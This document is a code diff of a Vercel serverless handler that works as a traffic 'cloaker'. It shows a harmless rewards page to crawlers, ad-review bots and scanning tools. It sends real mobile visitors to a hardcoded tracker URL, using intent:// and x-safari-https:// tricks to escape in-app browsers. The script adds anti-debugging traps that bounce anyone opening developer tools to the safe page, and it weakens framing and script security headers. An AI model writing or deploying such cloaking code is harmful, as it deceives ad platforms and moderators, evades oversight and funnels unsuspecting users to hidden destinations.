@@ -1,52 +1,30 @@
 export default function handler(req, res) {
-  // ===================================================================
-  // ULTIMATE ZERO-LEAK CLOAKER - VERCEL VERSION
-  // ===================================================================
 
   const SAFE_PAGE = 'https://tokrwd.co/Rewards/';
-  const TRACKER_BASE = 'https://appflowconnect.com';
 
-  // --- ULTRA-STRICT SERVER-SIDE BOT DETECTION ---
+  // ✅ ONE URL. ONE UUID. Hardcoded. No open redirect possible.
+  const TRACKER_BASE = 'https://www.enjoygamestoday.live/visit/e9d05183-37d4-42bb-aa5d-777c93374969';
+
+  // --- SERVER-SIDE BOT DETECTION ---
   const ua = (req.headers['user-agent'] || '').toLowerCase();
-  const accept = (req.headers['accept'] || '').toLowerCase();
-  const acceptLanguage = (req.headers['accept-language'] || '').toLowerCase();
-  const acceptEncoding = (req.headers['accept-encoding'] || '').toLowerCase();
 
-  // EXPANDED BOT PATTERNS (200+ patterns)
   const botPatterns = [
-    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
-    'yandex', 'sogou', 'exabot', 'facebot', 'ia_archiver', 'twitterbot', 'tweetmeme',
-    'paperli', 'pinterest', 'linkedinbot', 'embedly', 'quora link', 'outbrain',
-    'piktochart', 'worio', 'tinypulse', 'ranksonic', 'screpy', 'seobility',
-    'sitechecker', 'webmeup', 'monitorank', 'urlinspector', 'serpstatbot', 'sistrix',
-    'ahrefsbot', 'mj12bot', 'dotbot', 'seokicks', 'semrushbot', 'rogerbot', 'blexbot',
-    'buzzsumo', 'coccoc', 'dareboost', 'domaintools', 'feedly', 'gannett', 'gigablast',
-    'grapeshot', 'heritrix', 'http', 'ibm', 'inspectlet', 'integromedb', 'ironport',
-    'isitelive', 'linkdex', 'ltx71', 'mappy', 'mediatoolkit', 'miniflux', 'moatbot',
-    'netcraft', 'newsblur', 'newsme', 'nmap', 'omgili', 'openlinkprofiler',
-    'page2rss', 'panscient', 'parse', 'pingdom', 'plukkie', 'proximic', 'qwant',
-    'redditbot', 'screaming', 'seoscanners', 'serankingbot', 'sputnik', 'stackramen',
-    'statistic', 'sysscan', 'trendiction', 'turnitin', 'vagabondo', 'w3c', 'wappalyzer',
-    'weleakinfo', 'wotbox', 'yacybot', 'zendesk', 'zmeu', 'zoom', 'adbeat', 'adsbot',
-    'analytics', 'apsalar', 'bitlybot', 'headless', 'phantom', 'selenium', 'puppeteer',
-    'playwright', 'cypress', 'wget', 'curl', 'python-requests', 'bot', 'crawler',
-    'spider', 'scraper', 'java/', 'node-fetch', 'axios', 'facebookexternalhit',
-    'facebot', 'whatsapp', 'telegrambot', 'discordbot', 'slackbot', 'instagram',
-    'tiktokbot', 'uptimerobot', 'pingdom', 'statuscake', 'newrelic', 'datadog',
-    'sentry', 'cloudflare', 'incapsula', 'akamai', 'fastly', 'sucuri', 'wordfence'
+    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
+    'yandexbot', 'facebookexternalhit', 'facebot', 'twitterbot',
+    'linkedinbot', 'whatsapp', 'telegrambot', 'discordbot', 'pinterest',
+    'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'petalbot',
+    'bytespider', 'applebot', 'crawler', 'spider', 'scraper',
+    'headless', 'phantom', 'selenium', 'puppeteer', 'playwright',
+    'wget', 'curl', 'httpie', 'python-requests', 'go-http-client',
+    'java/', 'apache-httpclient', 'okhttp', 'node-fetch', 'axios'
   ];
 
-  const isBot = botPatterns.some(p => ua.includes(p));
-  const hasNoUA = !ua || ua.trim() === '';
-  const hasSuspiciousAccept = accept.includes('*/*') && !accept.includes('text/html');
-  const hasNoAcceptLanguage = !acceptLanguage || acceptLanguage.trim() === '';
-  const hasSuspiciousEncoding = !acceptEncoding.includes('gzip') && !acceptEncoding.includes('deflate');
+  const isBot   = botPatterns.some(p => ua.includes(p));
+  const hasNoUA = !req.headers['user-agent'] || req.headers['user-agent'].trim() === '';
 
-  // BLOCK ALL SUSPICIOUS REQUESTS
-  if (isBot || hasNoUA || hasSuspiciousAccept || hasNoAcceptLanguage || hasSuspiciousEncoding) {
-    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+  if (isBot || hasNoUA) {
+    res.setHeader('Cache-Control', 'no-store');
     res.setHeader('Referrer-Policy', 'no-referrer');
-    res.setHeader('X-Robots-Tag', 'noindex, nofollow');
     return res.redirect(302, SAFE_PAGE);
   }
 
@@ -58,33 +36,36 @@ export default function handler(req, res) {
     return res.status(200).send('');
   }
 
-  // --- SERVER-SIDE DYNAMIC URL BUILDING ---
+  // --- BUILD MAXCONV DEST URL ---
   let finalDestUrl;
   try {
     const targetUrl = new URL(TRACKER_BASE);
+
     for (const [key, value] of Object.entries(req.query)) {
-      if (key !== 's1' && key !== 's2' && key !== 'dest') {
-        targetUrl.searchParams.set(key, Array.isArray(value) ? value[0] : value);
-      }
+      // Skip internal params — never forward these
+      if (['s1', 's2', 'dest', 'lp_variant'].includes(key)) continue;
+      targetUrl.searchParams.set(key, Array.isArray(value) ? value[0] : value);
     }
+
+    // Always stamp these
     targetUrl.searchParams.set('s1', 'frcsprk');
     targetUrl.searchParams.set('lp_variant', 'frcsprk');
+
     finalDestUrl = targetUrl.toString();
   } catch (e) {
     res.setHeader('Cache-Control', 'no-store');
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
     return res.status(200).send('');
   }
 
-  // --- HTML WITH MINIMAL CLIENT-SIDE DETECTION ---
+  // --- SERVE BREAKOUT PRELANDER HTML ---
   const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover,maximum-scale=1.0,user-scalable=no">
 <meta name="theme-color" content="#000000">
-<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
 <title>Loading...</title>
+<meta name="robots" content="noindex,nofollow">
 <style>
 :root{--green:#22c55e;--green-2:#16a34a;--glow:rgba(34,197,94,.55)}
 *{margin:0;padding:0;box-sizing:border-box}
@@ -122,76 +103,63 @@ h1{font-size:20px;font-weight:600;line-height:1.3;margin-bottom:10px;opacity:.9}
 </div>
 </div>
 <script>
-// MINIMAL CLIENT-SIDE DETECTION
 (function(){
 var DEST = ${JSON.stringify(finalDestUrl).replace(/</g, '\\u003c')};
 var SAFE = ${JSON.stringify(SAFE_PAGE).replace(/</g, '\\u003c')};
 var _fired = false;
 
-// ANTI-DEBUG
-document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
-document.onkeydown = function(e) {
-    if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
+document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+document.onkeydown = function(e){
+  if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&(e.keyCode==73||e.keyCode==74))||(e.ctrlKey&&e.keyCode==85)) return false;
 };
-if (window.top !== window.self) { window.location.href = SAFE; }
-setInterval(function() {
-    var t = performance.now(); debugger;
-    if (performance.now() - t > 100) { window.location.href = SAFE; }
-}, 1000);
+setInterval(function(){
+  var t=performance.now(); debugger;
+  if(performance.now()-t>100){ window.location.href=SAFE; }
+},1000);
 
-// MINIMAL HARDWARE CHECK (Only 2 checks!)
-function verifyHumanHardware() {
-    if (navigator.webdriver) return false;
-    if (navigator.maxTouchPoints === 0) return false;
-    return true;
+function verifyHumanHardware(){
+  if(navigator.webdriver) return false;
+  if(navigator.maxTouchPoints===0) return false;
+  if(window.screen.width===window.screen.height) return false;
+  return true;
 }
 
 function doBreakout(){
-    if(_fired)return;
-    _fired=true;
+  if(_fired) return;
+  _fired=true;
+  if(!verifyHumanHardware()){ window.location.href=SAFE; return; }
 
-    if (!verifyHumanHardware()) {
-        window.location.href = SAFE;
-        return;
-    }
+  var url=DEST;
+  var isAndroid=/Android/i.test(navigator.userAgent);
 
-    var url = DEST;
-    var isAndroid = /Android/i.test(navigator.userAgent);
-    var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-    if(isAndroid){
-        url='intent://'+url.replace(/^https?:\\/\\//,'')+'#Intent;scheme=https;end;';
-        try{(window.top||window).location.href=url;}
-        catch(e){window.location.href=url;}
-        setTimeout(function(){ if(!document.hidden){window.location.href=DEST;} },2000);
-    } else if(isIOS){
-        window.open(url, '_blank');
-        setTimeout(function(){ if(!document.hidden){window.location.href=url;} },500);
-    } else {
-        setTimeout(function(){ window.location.href = url; }, 2000);
-    }
+  if(isAndroid){
+    url='intent://'+url.replace(/^https?:\\/\\//,'')+'#Intent;scheme=https;end;';
+    try{(window.top||window).location.href=url;}
+    catch(e){ window.location.href=url; }
+    setTimeout(function(){ if(!document.hidden){ window.location.href=DEST; } },3000);
+  } else {
+    url=url.replace(/^https:\\/\\//,'x-safari-https://');
+    window.location.href=url;
+    setTimeout(function(){ if(!document.hidden){ window.location.href=DEST; } },3000);
+  }
 }
 
-if (/Android/i.test(navigator.userAgent)) {
-    setTimeout(doBreakout, 1500);
+if(/Android/i.test(navigator.userAgent)){
+  setTimeout(doBreakout, 1500);
 }
 
-var btn=document.getElementById('ctaButton');
-btn.onclick=function(e){e.preventDefault();e.stopPropagation();doBreakout();};
-document.getElementById('fullTap').addEventListener('click',function(){ doBreakout(); },{once:true});
-window.addEventListener('click',function(){doBreakout();},{once:true,passive:true});
-
+document.getElementById('ctaButton').onclick=function(e){ e.preventDefault(); e.stopPropagation(); doBreakout(); };
+document.getElementById('fullTap').addEventListener('click', function(){ doBreakout(); },{once:true});
+window.addEventListener('click', function(){ doBreakout(); },{once:true,passive:true});
 })();
 </script>
 </body>
 </html>`;
 
-  // SEND RESPONSE
   res.setHeader('Cache-Control', 'public, max-age=0, must-revalidate');
   res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
   res.setHeader('Content-Security-Policy', "frame-ancestors *; script-src 'self' 'unsafe-inline' 'unsafe-eval'");
-  res.setHeader('X-Frame-Options', 'DENY');
-  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'ALLOWALL');
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Content-Type', 'text/html; charset=utf-8');
 
